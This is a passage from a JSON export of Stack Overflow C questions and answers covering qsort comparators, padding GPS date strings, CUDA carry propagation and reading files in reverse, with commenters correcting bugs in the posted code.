(height &lt;= 0)\n    {\n      printf(\"Error. Positive #s only. \\n\");\n    }\n    else if (height &gt; 23)\n    {\n      printf(\"Error. # must be from 0-23. \\n\");\n    }\n    else if (height &gt; 0 || height &lt;= 23)\n    {\n      signal = 'y';\n    }\n    else\n    {\n      printf(\"Can you bulid a pyramid with letters? I thought so... \\n\");\n    }\n  }\n\n  int i, j, k;\n\n  for (i = 1; i &lt;= height; i++)\n  {\n    if (height &lt;= 8)\n      printf(\"\\t\");\n    else if (height &lt;= 16)\n      printf(\"\\t\\t\");\n    else if (height &lt;= 23)\n      printf(\"\\t\\t\\t\");\n\n    for (k = 0; k &lt; i; k++)\n    {\n      printf(\"\\b\");\n    }\n\n    for (j = 0; j &lt;= i; j++)\n    {\n      printf(\"#\");\n    }\n    printf(\"\\n\");\n  }\n}\n</code></pre>\n\n<p>If a user decides to be silly and enters a string, the program goes into an infinite loop. I thought the program would use the else statement but doesn't. How do I handle this?</p>\n"}, {"tags": ["c", "sorting", "qsort"], "comments": [{"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1449669978, "post_id": 34180666, "comment_id": 56107644, "body": "In case of &quot;does not work&quot;, please post exactly <i>what</i> that doesn&#39;t work. In this case, posting the compiler errors would have made it much easier to answer the question."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1449670063, "post_id": 34180666, "comment_id": 56107699, "body": "Also, it should be <code>one - two</code>."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1449862662, "post_id": 34180666, "comment_id": 56206159, "body": "@Lundin: this kind of sloppy comparison is flawed in subtle ways.  See my answer."}], "answers": [{"tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 0, "last_activity_date": 1449671612, "creation_date": 1449671612, "answer_id": 34181397, "question_id": 34180666, "link": "https://stackoverflow.com/questions/34180666/sorting-array-of-structs/34181397#34181397", "title": "Sorting array of structs", "body": "<p>Two problems:</p>\n\n<pre><code>qsort(mystr,array_index,sizeof(mystr),magic);\n</code></pre>\n\n<p><code>mystr</code> is a pointer to <code>SRT</code>, so you're passing in the size of a pointer to the struct, not the size of the struct:</p>\n\n<pre><code>qsort(mystr,array_index,sizeof(STR),magic);\n</code></pre>\n\n<p>Then there's this:</p>\n\n<pre><code>int one=((const struct mystr*)a)-&gt;number;\nint two(( const struct myst*)b)-&gt;number;\n</code></pre>\n\n<p><code>mystr</code> is a variable name, not a type, and <code>myst</code> isn't defined anywhere.  You need the type name here:</p>\n\n<pre><code>int one=((const SRT *)a)-&gt;number;\nint two=((const SRT *)b)-&gt;number;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": true, "score": 2, "last_activity_date": 1449862247, "creation_date": 1449862247, "answer_id": 34231150, "question_id": 34180666, "link": "https://stackoverflow.com/questions/34180666/sorting-array-of-structs/34231150#34231150", "title": "Sorting array of structs", "body": "<p>You cannot reliably sort the array with the function as written:</p>\n\n<ul>\n<li><p>It has syntax errors, some of which are typos, others indicate a confusion between types, struct tags and variable names.</p></li>\n<li><p><code>return (one - two);</code> only works for reasonably small values of <code>one</code> and <code>two</code>. It will invoke undefined behavior if there is an integer arithmetic overflow.  For example, if <code>one == INT_MAX</code> and <code>two == -1</code>, the value of <code>one - two</code> is not specified by the C language and on common platform it is likely to return <code>INT_MIN</code>, a negative value, leading to incorrect sorting.</p></li>\n</ul>\n\n<p>A simple solution is this:</p>\n\n<pre><code>int sort_function(const void *a, const void *b) {\n    int one = ((const SRT*)a)-&gt;number;\n    int two = ((const SRT*)b)-&gt;number;\n\n    return (one &gt; two) - (one &lt; two);\n}\n</code></pre>\n\n<p>The expression <code>(one &gt; two) - (one &lt; two)</code> evaluates to <code>-1</code> if <code>one</code> is less than <code>two</code>, <code>0</code> if they are equal and <code>1</code> otherwise. In C, comparisons evaluate to <code>0</code> if false and <code>1</code> if true.</p>\n\n<p>The sorting function should be used this way:</p>\n\n<pre><code>qsort(mystr, array_count, sizeof(*mystr), sort_function);\n</code></pre>\n\n<ul>\n<li>The second argument is the number of structures in the array pointed to by <code>mystr</code>.</li>\n<li>The third argument is the size of a single structure: <code>sizeof(mystr)</code> is the size of the pointer, not the size of what is points to.</li>\n<li>Avoid mysterious names like <code>magic</code>... use descriptive names for types, functions and variables.</li>\n</ul>\n"}], "owner": {"reputation": 229, "user_id": 3706129, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/2e17cff6efe2f0faf62cab3d57977d58?s=128&d=identicon&r=PG&f=1", "display_name": "user3706129", "link": "https://stackoverflow.com/users/3706129/user3706129"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 99, "favorite_count": 0, "accepted_answer_id": 34231150, "answer_count": 2, "score": 0, "last_activity_date": 1449862581, "creation_date": 1449669600, "last_edit_date": 1449862581, "question_id": 34180666, "link": "https://stackoverflow.com/questions/34180666/sorting-array-of-structs", "title": "Sorting array of structs", "body": "<p>I have defined an array of structs</p>\n\n<pre><code>typedef struct sorting {\n    int number\n} SRT;\n\nSRT *mystr = NULL;\n</code></pre>\n\n<p>which I later dynamically allocated.\nand I want to sort it by the <code>number</code> int;</p>\n\n<p>What kind of function do I have to write in order for qsort to do it? I have written :</p>\n\n<pre><code>qsort(mystr,array_index,sizeof(mystr),magic);\n\nint magic(const void *a, const void *b) {\n    int one=((const struct mystr*)a)-&gt;number;\n    int two(( const struct myst*)b)-&gt;number;\n\n    return ( one-two);\n}\n</code></pre>\n\n<p>but it didn't work. How can I do it?\nit throwed errors about not naming a type.</p>\n"}, {"tags": ["c", "date"], "comments": [{"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 6, "creation_date": 1449669656, "post_id": 34180650, "comment_id": 56107424, "body": "What does  ` &quot;1111&quot; `  mean to you?"}, {"owner": {"reputation": 677, "user_id": 3846218, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8cd6a0a530b5d557b791c6cd05ca2c87?s=128&d=identicon&r=PG&f=1", "display_name": "AlexPogue", "link": "https://stackoverflow.com/users/3846218/alexpogue"}, "edited": false, "score": 7, "creation_date": 1449669662, "post_id": 34180650, "comment_id": 56107432, "body": "How can you tell whether 11215 is supposed to be 11th Feb 2015 or 1st Dec 2015?"}, {"owner": {"reputation": 6024, "user_id": 2417459, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/QcuXb.png?s=128&g=1", "display_name": "i486", "link": "https://stackoverflow.com/users/2417459/i486"}, "edited": false, "score": 3, "creation_date": 1449669682, "post_id": 34180650, "comment_id": 56107450, "body": "How you can differentiate 11.1 and 1.11? They are all 11115"}, {"owner": {"reputation": 3297, "user_id": 2546099, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/3f7b2455429f817843ab8524d67f37a1?s=128&d=identicon&r=PG&f=1", "display_name": "arc_lupus", "link": "https://stackoverflow.com/users/2546099/arc-lupus"}, "edited": false, "score": 2, "creation_date": 1449669810, "post_id": 34180650, "comment_id": 56107539, "body": "Without knowing if  <code>11215</code> is the 11th february or 1st december by additional information, it is impossible to do that."}, {"owner": {"reputation": 2124, "user_id": 795970, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/3e908699d3ba1d553f600c103d891d54?s=128&d=identicon&r=PG&f=1", "display_name": "matt", "link": "https://stackoverflow.com/users/795970/matt"}, "reply_to_user": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 1, "creation_date": 1449669900, "post_id": 34180650, "comment_id": 56107597, "body": "@BasileStarynkevitch 1111 would be 1st Jan 2011"}, {"owner": {"reputation": 2124, "user_id": 795970, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/3e908699d3ba1d553f600c103d891d54?s=128&d=identicon&r=PG&f=1", "display_name": "matt", "link": "https://stackoverflow.com/users/795970/matt"}, "edited": false, "score": 0, "creation_date": 1449669952, "post_id": 34180650, "comment_id": 56107627, "body": "The string length could give a pointer to wether it is missing one leading zero or two"}, {"owner": {"reputation": 904, "user_id": 4004688, "user_type": "registered", "accept_rate": 67, "profile_image": "https://graph.facebook.com/1002512873/picture?type=large", "display_name": "Itay Sela", "link": "https://stackoverflow.com/users/4004688/itay-sela"}, "edited": false, "score": 0, "creation_date": 1449670002, "post_id": 34180650, "comment_id": 56107661, "body": "why don&#39;t you use time_t and epoch ( counting seconds since 1.1.1970 ) and covert it to date when you print it"}, {"owner": {"reputation": 2124, "user_id": 795970, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/3e908699d3ba1d553f600c103d891d54?s=128&d=identicon&r=PG&f=1", "display_name": "matt", "link": "https://stackoverflow.com/users/795970/matt"}, "reply_to_user": {"reputation": 3297, "user_id": 2546099, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/3f7b2455429f817843ab8524d67f37a1?s=128&d=identicon&r=PG&f=1", "display_name": "arc_lupus", "link": "https://stackoverflow.com/users/2546099/arc-lupus"}, "edited": false, "score": 0, "creation_date": 1449670055, "post_id": 34180650, "comment_id": 56107693, "body": "@arc_lupus it&#39;s GPS date so it is always D M Y, the year is always 2 digits but the day and month could be wither 1 or 2 digits"}, {"owner": {"reputation": 25937, "user_id": 338904, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/dea29233fa03ea84f8a853102deb0344?s=128&d=identicon&r=PG", "display_name": "e2-e4", "link": "https://stackoverflow.com/users/338904/e2-e4"}, "edited": false, "score": 2, "creation_date": 1449670154, "post_id": 34180650, "comment_id": 56107774, "body": "If the month is always the current month, for instance, there is something to do. Otherwise, you never know, at it is mentioned above, if 11215 is december or february. Of course if there is initially a space between day and month ... that&#39;s easier!"}, {"owner": {"reputation": 81300, "user_id": 296974, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0e26cfe3ac75cd582ca200fbc6fa0421?s=128&d=identicon&r=PG", "display_name": "glglgl", "link": "https://stackoverflow.com/users/296974/glglgl"}, "edited": false, "score": 1, "creation_date": 1449670217, "post_id": 34180650, "comment_id": 56107822, "body": "Hurt the guy who made such ambiguous definitions. (Unless, of course, somewhere is defined if <code>11215</code> means 2015-02-11 or 2015-12-01, but even then, it is useful to have the format as simple as possible.) , You&#39;ll have to find a valid and unique definition. Only then you can start with e. g. differentiating between your cases according to the string length or so."}, {"owner": {"reputation": 81300, "user_id": 296974, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0e26cfe3ac75cd582ca200fbc6fa0421?s=128&d=identicon&r=PG", "display_name": "glglgl", "link": "https://stackoverflow.com/users/296974/glglgl"}, "edited": false, "score": 0, "creation_date": 1449670254, "post_id": 34180650, "comment_id": 56107860, "body": "Find out if there is a rule that e. g. the day may only be shortened if the month isn&#39;t shortened or something like this."}, {"owner": {"reputation": 81300, "user_id": 296974, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0e26cfe3ac75cd582ca200fbc6fa0421?s=128&d=identicon&r=PG", "display_name": "glglgl", "link": "https://stackoverflow.com/users/296974/glglgl"}, "edited": false, "score": 1, "creation_date": 1449670297, "post_id": 34180650, "comment_id": 56107893, "body": "&quot;it&#39;s GPS date so it is always D M Y&quot; Non sequitur. Someone made this (incomplete) transition, and you should find out how to remove the ambiguity in it."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1449675105, "post_id": 34180650, "comment_id": 56111545, "body": "<code>&quot;181215&quot; &#47;&#47;11th Dec 2015</code> is confusing.  Surely that is the <i>18th</i> of December."}], "answers": [{"comments": [{"owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 0, "creation_date": 1449674201, "post_id": 34181093, "comment_id": 56110878, "body": "You might also choose to log a warning if it&#39;s a 5-digit string and it matches one of the ambiguous dates <code>[12]1[12]..</code> or <code>311..</code> (in regexp syntax)."}, {"owner": {"reputation": 81300, "user_id": 296974, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0e26cfe3ac75cd582ca200fbc6fa0421?s=128&d=identicon&r=PG", "display_name": "glglgl", "link": "https://stackoverflow.com/users/296974/glglgl"}, "reply_to_user": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 1, "creation_date": 1449674493, "post_id": 34181093, "comment_id": 56111103, "body": "@TobySpeight Right. I suppose it <i>is</i> defined somewhere, but the OP doesn&#39;t want to tell us. Either way could be appropriate then..."}], "tags": [], "owner": {"reputation": 81300, "user_id": 296974, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0e26cfe3ac75cd582ca200fbc6fa0421?s=128&d=identicon&r=PG", "display_name": "glglgl", "link": "https://stackoverflow.com/users/296974/glglgl"}, "is_accepted": false, "score": 1, "last_activity_date": 1449675026, "last_edit_date": 1449675026, "creation_date": 1449670784, "answer_id": 34181093, "question_id": 34180650, "link": "https://stackoverflow.com/questions/34180650/formatting-dates-in-c/34181093#34181093", "title": "Formatting dates in C", "body": "<p>Try it like this:</p>\n\n<pre><code>char str[8];\nsprintf(str, \"%d\", date);\nchar corr_str[8];\n\nswitch (strlen(str)) {\n  case 6: // easiest way:\n    strcpy(corr_str, str);\n    break:\n  case 4:\n    corr_str[0] = '0';\n    corr_str[1] = str[0];\n    corr_str[2] = '0';\n    // corr_str[3] = str[1];\n    // corr_str[4] = str[2];\n    // corr_str[5] = str[3];\n    strcpy(corr_str + 3, str + 1);\n    break;\n  case 5: // Well, what now? Is the day shortened or the month?\n    // Here we assume the day is shortened, so 11215 is 2015-12-01.\n    corr_str[0] = '0';\n    strcpy(corr_str + 1, str);\n    break;\n    // Here we assume the month is shortened, so 11215 is 2015-02-11.\n    strcpy(corr_str, str);\n    corr_str[2] = '0';\n    strcpy(corr_str + 3, str + 2);\n    break;\n</code></pre>\n\n<p>and then proceed as you did before.</p>\n"}, {"tags": [], "owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "is_accepted": true, "score": 1, "last_activity_date": 1449825352, "last_edit_date": 1449825352, "creation_date": 1449676621, "answer_id": 34183275, "question_id": 34180650, "link": "https://stackoverflow.com/questions/34180650/formatting-dates-in-c/34183275#34183275", "title": "Formatting dates in C", "body": "<p>Here's a solution that gives a recognisable error output for ambiguous dates:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n/* N.B. returns a pointer to static storage - not for production use */\n/* Returns \"??????\" on failure */\nconst char *reformat(const char *s)\n{\n    static char buf[9];\n\n    int d, m, y;                /* day, month, year */\n    switch (strlen(s)) {\n    case 6:\n        return s;\n    case 5:\n        if (s[1] == '1' &amp;&amp; s[2] &lt;= '2') {\n            /* second digit may be part of day or month */\n            if (s[0] &lt;= '2' || s[0] &lt;= '3' &amp;&amp; s[2] == '1')\n                return \"??????\";              /* ambiguous string */\n            /* 1-digit day, 2-digit month */\n            sscanf(s, \"%1d%2d%2d\", &amp;d, &amp;m, &amp;y);\n        break;\n        }\n        /* 2-digit day; 1-digit month */\n        sscanf(s, \"%2d%1d%2d\", &amp;d, &amp;m, &amp;y);\n        break;\n    case 4:\n        sscanf(s, \"%1d%1d%2d\", &amp;d, &amp;m, &amp;y);\n        sprintf(buf, \"%02d%02d%02d\", d, m, y);\n        return buf;\n    default:\n        return \"??????\";              /* invalid input length */\n    };\n    sprintf(buf, \"%02d%02d%02d\", d, m, y);\n    return buf;\n}\n</code></pre>\n\n<p>And here's a test program:</p>\n\n<pre><code>int main(int argc, char **argv)\n{\n    while (*++argv)\n        printf(\"%6s -&gt; %s\\n\", *argv, reformat(*argv));\n    return 0;\n}\n</code></pre>\n\n<p>On my test cases, it produces:</p>\n\n<pre><code>   111 -&gt; ??????\n  8515 -&gt; 080515\n181215 -&gt; 181215\n  1111 -&gt; 010111\n 11215 -&gt; ??????\n 31211 -&gt; 031211\n 29212 -&gt; 290212\n 21200 -&gt; ??????\n 21300 -&gt; 210300\n11111111 -&gt; ??????\n</code></pre>\n"}], "owner": {"reputation": 2124, "user_id": 795970, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/3e908699d3ba1d553f600c103d891d54?s=128&d=identicon&r=PG&f=1", "display_name": "matt", "link": "https://stackoverflow.com/users/795970/matt"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 60, "favorite_count": 0, "closed_date": 1449699794, "accepted_answer_id": 34183275, "answer_count": 2, "score": 0, "last_activity_date": 1449825352, "creation_date": 1449669554, "last_edit_date": 1449669812, "question_id": 34180650, "link": "https://stackoverflow.com/questions/34180650/formatting-dates-in-c", "closed_reason": "Needs more focus", "title": "Formatting dates in C", "body": "<p>I have some GPS string dates that look like:</p>\n\n<pre><code> \"181215\" //11th Dec 2015\n \"211115\" //21st Nov 2015\n</code></pre>\n\n<p>I can work with this format but but when the day or month is one digit it looks like:</p>\n\n<pre><code> \"11215\" //1st Dec 2015\n \"8515\" //8th May 2015\n</code></pre>\n\n<p>What's the best way to turn <code>8515</code> into <code>080515</code> in C?</p>\n\n<p>I basically need to turn the string into 3 Integers, I'm doing it like this:</p>\n\n<pre><code>//date: 171115\nchar str[8];\nsprintf(str, \"%d\", date);\nchar component[3];\n\nsprintf(component,\"%c%c\",str[0],str[1]);\nint day = strtof(component, NULL);\n\nsprintf(component,\"%c%c\",str[2],str[3]);\nint month = strtof(component, NULL);\n\nsprintf(component,\"%c%c\",str[4],str[5]);\nint year = strtof(component, NULL) + 2000;\n</code></pre>\n"}, {"tags": ["c++", "c", "arrays", "cuda", "ptx"], "comments": [{"owner": {"reputation": 119299, "user_id": 1695960, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7f9f557c03db19232aa410540af2f966?s=128&d=identicon&r=PG", "display_name": "Robert Crovella", "link": "https://stackoverflow.com/users/1695960/robert-crovella"}, "edited": false, "score": 1, "creation_date": 1449761789, "post_id": 34180644, "comment_id": 56156111, "body": "<a href=\"http://stackoverflow.com/questions/12957116/large-integer-addition-with-cuda\">This</a> may give you some ideas.  However the code in my answer there is designed to run in a single threadblock."}], "owner": {"reputation": 39, "user_id": 2491607, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/de90a90f8734ca68809cc892d0f78f7a?s=128&d=identicon&r=PG", "display_name": "user2491607", "link": "https://stackoverflow.com/users/2491607/user2491607"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 78, "favorite_count": 0, "closed_date": 1478333494, "answer_count": 0, "score": 1, "last_activity_date": 1449701613, "creation_date": 1449669538, "last_edit_date": 1449701613, "question_id": 34180644, "link": "https://stackoverflow.com/questions/34180644/process-a-cuda-array-as-a-single-object", "closed_reason": "Duplicate", "title": "Process a CUDA Array as a single object", "body": "<p>I have been pounding my head against a wall trying to solve this issue for about a month now and neither my C skills nor my google-fu has been strong enough to come up with a solution.</p>\n\n<p>One of my favorite side projects has been and continues to be attempting to find a palindrome for the number 196 via the reverse and add method:</p>\n\n<pre><code>196 + 691 = 887\n\n887 + 788 = 1675\n</code></pre>\n\n<p>And on and on until the result reads the same front to back.</p>\n\n<p>Lately, my approach of choice has been to use cuda but I've run into the same snag over and over.  The carry.</p>\n\n<p>Backing up, I represent the number in memory as an array of unsigned char, each digit is one char - so essentially unpacked bcd.</p>\n\n<pre><code>__device__ __align__(4) unsigned char DigitArray[1024 * 1024];\n</code></pre>\n\n<p>The partial sum generation is easy in parallel.  I store the current digit count in device memory, then on each iteration:</p>\n\n<pre><code>__device__ int DigitCount;\n\n__global__ void PartialSums()\n{\n    int idx = GlobalThreadIndex();\n    int rev = DigitCount - (1 +  idx);\n    unsigned char sum = DigitArray[idx];\n    __threadfence();\n    if(rev &gt;= 0)\n    { \n        sum += DigitArray[rev];\n    }\n    DigitArray[idx] = sum;\n}\n</code></pre>\n\n<p>All very well and good.</p>\n\n<p>Now for the carry.<br>\nIn a perfect world, I would want the following to happen:</p>\n\n<pre><code>__device__ unsigned int SumScratch[1024*256];\n\n__global__ void Carry()\n{\n    int idx = GlobalThreadIndex();\n    SumScratch[idx] = 0xF6F6F6F6;\n    __threadfence();\n    unsigned int * ptr = (unsigned int *)(DigitArray + (idx * size of(unsigned char));\n    SumScratch[idx] += *ptr;\n    __threadfence();\n    unsigned int cMask = __vcmples(SumScratch[idx], 0x0A0A0A0A);\n    unsigned int nCMask = ~cMask;\n    *ptr = __vadd4((SumScratch[idx] &amp; cMask), __vsub4((SumScratch[idx] &amp; nCMask), (OxF6F6F6F6 &amp; nCMask)) &amp; nCMask);\n\n}\n</code></pre>\n\n<p>In this perfect world, the line</p>\n\n<pre><code>SumScratch[idx] += *ptr;\n</code></pre>\n\n<p>Would would overflow into the next byte if the most significant byte in *ptr was greater than 9.</p>\n\n<p>That doesn't happen though, so the indicated line can be replaced with:</p>\n\n<pre><code>unsigned int val = *ptr;\nunsigned int ret = 0;\nunsigned int carryOut = 0;\n\nasm(\"{\"\n    \"add.cc.u32 %0, %2, %3;\"\n    \"addc.cc.u32 %1, 0, 0;\"\n    \"}\"\n    : \"=r\"(ret), \"=r\"(carryOut)\n    : \"r\"(val), \"r\"(OxF6F6F6F6)\n);\n\nSumScratch[idx] = 0;\n__threadfence();\natomicAdd(&amp;(SumScratch[idx]), ret);\natomicadd(&amp;(SumScratch[idx+1]), carryOut);\n</code></pre>\n\n<p>Followed by all the simd instructions for masking.</p>\n\n<p>The goal of this being, if you had:\n(Most Sig to Least)</p>\n\n<pre><code>0x00090401 0x09090909 0x10081204\n</code></pre>\n\n<p>Then the most significant byte of the least sufficient int, when added to F6 would result in a carry out into the middle int's sums (pist addition to F6... all bytes are FF) resulting in all its bits flipping to 0 and it carrying out into the most significant int.  </p>\n\n<p>So, in reality, I want to treat the whole array as though it was just a single binary sequence and allow bits to just flip.  </p>\n\n<p>Any thoughts or ideas would be greatly appreciated.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 3, "creation_date": 1449669436, "post_id": 34180537, "comment_id": 56107264, "body": "Use <code>stegf()</code> rather than <code>fgets()</code>?  ;-)"}, {"owner": {"reputation": 881, "user_id": 5635258, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b69b37f21456c0333195948af74563b9?s=128&d=identicon&r=PG&f=1", "display_name": "StephenG", "link": "https://stackoverflow.com/users/5635258/stepheng"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1449669982, "post_id": 34180537, "comment_id": 56107646, "body": "You can use <code>fseek()</code> to control the position you read from in a file.  @chux: that&#39;s sooo bold. :-)"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1449770604, "post_id": 34180537, "comment_id": 56161823, "body": "when calling <code>fopen()</code>, always check (!=NULL)  the returned value to assure the operation was successful."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1449770959, "post_id": 34180537, "comment_id": 56161993, "body": "do you want to just reverse the characters of the line read or reverse all the characters in the file or reverse the order of the lines in the file?"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1449771138, "post_id": 34180537, "comment_id": 56162086, "body": "the posted code contains several &#39;magic&#39; numbers&#39;.  &#39;magic&#39; numbers make the code difficult to understand and are a headache when debugging and/or maintaining the code. some of the magic numbers are: 100, 10, 9.   Suggest using #defines or an enum to give those numbers meaningful names then using those meaningful names throughout the code"}], "answers": [{"comments": [{"owner": {"reputation": 2420, "user_id": 410342, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/af5f0b031000821a8c179733db0a2f9e?s=128&d=identicon&r=PG", "display_name": "Shotgun Ninja", "link": "https://stackoverflow.com/users/410342/shotgun-ninja"}, "edited": false, "score": 0, "creation_date": 1449673423, "post_id": 34180632, "comment_id": 56110310, "body": "Woo pass-by-reference!"}], "tags": [], "owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "is_accepted": false, "score": 1, "last_activity_date": 1449669503, "creation_date": 1449669503, "answer_id": 34180632, "question_id": 34180537, "link": "https://stackoverflow.com/questions/34180537/reading-a-text-file-backwards-and-put-in-c/34180632#34180632", "title": "Reading a text file backwards and put in C", "body": "<p>Reason is this -</p>\n\n<pre><code>fgets(buffer,100,f);       // check return of fgets\na[i]=buffer;               // Note - buffer is modified in each iteration\n</code></pre>\n\n<p>You point to string which is stored in <code>buffer</code> in <strong>last iteration</strong>. Every pointer points to <em>last string read</em> . And each time you print same string is printed . </p>\n\n<p>What you should do is <em>allocate memory</em> to pointer <code>a[i]</code> , and use <code>strcpy</code> to copy the string .</p>\n"}, {"tags": [], "owner": {"reputation": 83, "user_id": 1408542, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/4cf7d7a7612ce157f8db84da3fc56a9f?s=128&d=identicon&r=PG", "display_name": "user1408542", "link": "https://stackoverflow.com/users/1408542/user1408542"}, "is_accepted": false, "score": 0, "last_activity_date": 1449670827, "creation_date": 1449670827, "answer_id": 34181109, "question_id": 34180537, "link": "https://stackoverflow.com/questions/34180537/reading-a-text-file-backwards-and-put-in-c/34181109#34181109", "title": "Reading a text file backwards and put in C", "body": "<p>If you know it's always 10 lines, you could declare a as a 2d array.</p>\n\n<p>Something like this should be better.</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;string.h&gt;\nint main()\n{\n    int i;\n    char buffer[100];\n    char a[10][100];\n    FILE *f,*p;\n    f=fopen(\"Frozen_snowman.txt\",\"r\");\n    p=fopen(\"Reverse.txt\",\"w\");\n    for(i=0;i&lt;10;i++)\n    {\n        fgets(buffer,100,f);\n        strcpy (a[i], buffer);\n    }\n    for(i=9;i&gt;-1;i--)\n    {\n        fputs(a[i],p);\n    }\n\n    return 0;   \n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "is_accepted": false, 